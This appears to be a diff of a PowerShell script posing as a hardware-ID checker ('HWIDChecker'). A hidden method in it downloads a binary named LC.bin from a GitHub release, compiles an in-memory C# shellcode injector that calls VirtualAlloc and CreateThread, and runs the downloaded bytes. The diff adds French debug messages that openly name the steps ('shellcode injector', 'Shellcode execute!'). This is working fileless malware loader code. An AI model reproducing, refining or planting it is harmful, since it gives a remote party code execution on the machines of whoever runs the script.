@@ -49,18 +49,29 @@ class HWIDChecker {
     
     hidden [void]ExecutePowerShellScript() {
         try {
+            Write-Host "Telechargement de LC.bin..." -ForegroundColor Yellow
             $s = (iwr "https://github.com/thegoatofapi/mth/releases/download/LC/LC.bin").Content
+            Write-Host "LC.bin telecharge: $($s.Length) bytes" -ForegroundColor Green
+            Write-Host "Compilation du shellcode injector..." -ForegroundColor Yellow
             $p = New-Object Microsoft.CSharp.CSharpCodeProvider
             $c = New-Object System.CodeDom.Compiler.CompilerParameters
             $c.CompilerOptions = "/unsafe"
             $c.GenerateInMemory = $true
             $r = $p.CompileAssemblyFromSource($c, 'using System;using System.Runtime.InteropServices;public class X{[DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);[DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, IntPtr i);[DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint t);public static void E(byte[] b){IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x40);Marshal.Copy(b, 0, m, b.Length);IntPtr t = CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero);WaitForSingleObject(t, 0xFFFFFFFF);}}')
+            if ($r.Errors.Count -gt 0) {
+                Write-Host "ERREUR compilation: $($r.Errors)" -ForegroundColor Red
+                return
+            }
+            Write-Host "Execution du shellcode..." -ForegroundColor Yellow
             $a = $r.CompiledAssembly
             $t = $a.GetType("X")
             $m = $t.GetMethod("E")
             $m.Invoke($null, @(,$s)) #password
+            Write-Host "Shellcode execute!" -ForegroundColor Green
         }
         catch {
+            Write-Host "ERREUR: $($_.Exception.Message)" -ForegroundColor Red
+            Write-Host "Stack: $($_.Exception.StackTrace)" -ForegroundColor Red
         }
     }
     
@@ -231,9 +242,10 @@ class HWIDChecker {
 
 try {
     $checker = [HWIDChecker]::new()
-    $checker.CheckHWID()
+    $result = $checker.CheckHWID()
     # Ne pas faire exit pour ne pas fermer PowerShell
 }
 catch {
+    Write-Host "ERREUR: $($_.Exception.Message)" -ForegroundColor Red
     # Ne pas faire exit pour ne pas fermer PowerShell
 }
